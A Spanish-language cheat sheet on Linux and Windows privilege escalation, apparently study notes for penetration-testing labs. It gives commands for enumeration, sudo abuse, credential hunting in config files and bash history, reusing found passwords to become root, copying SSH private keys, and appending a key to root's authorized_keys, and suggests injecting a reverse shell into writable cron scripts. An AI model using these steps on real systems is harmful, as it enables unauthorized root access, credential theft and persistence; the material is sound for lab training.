# Escalada de Privilegios (Resumen)

## 1) Recursos de enumeración
- **HackTricks**: checklist Linux y Windows → https://book.hacktricks.xyz  
- **PayloadsAllTheThings**: cheatsheets PrivEsc.  
- Scripts útiles:
  - **Linux**: LinEnum, linuxprivchecker, **LinPEAS**
  - **Windows**: Seatbelt, JAWS, **WinPEAS**

Ejemplo ejecutar LinPEAS:
```bash
./linpeas.sh
```

---

## 2) Exploits del Kernel
- Buscar versión del SO (ej. `uname -a` o salida LinPEAS)  
- Consultar CVEs en Google / searchsploit.  
Ejemplo:
```bash
searchsploit dirtycow
```
> ⚠️ Exploits de kernel pueden causar inestabilidad → probar en lab.

---

## 3) Software vulnerable
- Listar programas instalados:
```bash
dpkg -l         # Linux
dir "C:\Program Files"   # Windows
```
- Buscar exploits para software viejo.

---

## 4) Privilegios de usuario
### Comprobar sudo
```bash
sudo -l
```

Ejemplo salida:
```
(user1) (ALL : ALL) ALL
```
Elevar privilegio:
```bash
sudo su -
whoami     # → root
```

Ejemplo NOPASSWD:
```bash
sudo -l
(user1) NOPASSWD: /bin/echo
sudo -u user /bin/echo Hello
```

> Usa **GTFOBins** (Linux) o **LOLBAS** (Windows) para explotar binarios con privilegios.

---

## 5) Tareas programadas / Cron
- Revisa directorios cron editables:
```
/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root
```
> Si hay permisos de escritura → inyectar reverse shell en el script.

---

## 6) Credenciales expuestas
- Buscar en archivos comunes:
```bash
grep -Ri "password" /var/www/html
cat ~/.bash_history
```
Ejemplo hallazgo:
```
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');
```
> Reusar credenciales:
```bash
su -
# pass: password123
whoami   # → root
```

---

## 7) Claves SSH
- Ubicación:
```
/home/user/.ssh/id_rsa
/root/.ssh/id_rsa
```

Copiar clave privada y ajustar permisos:
```bash
chmod 600 id_rsa
ssh root@10.10.10.10 -i id_rsa
```

Generar nueva clave:
```bash
ssh-keygen -f key
```
Subir pública a `authorized_keys` en víctima:
```bash
echo "ssh-rsa AAAA... user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
```

---

## 8) Tips
- Enumera primero con **scripts** o manual.  
- **Explota**: kernel viejo, sudo, SUID, cron, credenciales, ssh keys.  
- Usa **GTFOBins/LOLBAS** para encontrar comandos aprovechables.  
